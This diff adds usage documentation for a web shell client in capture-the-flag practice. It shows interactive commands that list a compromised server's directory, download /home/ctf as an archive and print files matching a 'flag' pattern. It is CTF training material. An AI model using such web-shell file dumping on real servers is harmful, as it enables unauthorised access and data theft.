@@ -88,6 +88,23 @@ If you want to dump the files from the server:
     >>> print sh.download("/home/ctf")
     Written contents of /home/ctf file to /home/user/downloads/_home_ctf-2016-10-13T15:32:33.tar.gz
 
+When in interactive mode you can use the `:download` command to achieve the
+same. Also the `:printlike` command is available as an alias for the
+print_all_files_like method:
+
+    >>> # same WebShellClient as above
+    >>> ws.interactive()
+    ctf@pwned /home/ctf/wstests/ping > ls
+    something.php
+    ping.php
+    ctf@pwned /home/ctf/wstests/ping > :download /home/ctf
+    Written contents of /home/ctf file to /home/user/downloads/_home_ctf-2016-10-13T16:04:01.tar.gz
+    ctf@pwned /home/ctf/wstests/ping > :printlike .*flag.* /home/ctf/
+    ---- /home/ctf/flag.txt ----
+    CTF{omgwtf_I_got_a_flag}
+    ---- /home/ctf/somedir/real_flag.txt ----
+    CTF{jk_this_is_the_r3al_flag}
+
 
 """
 
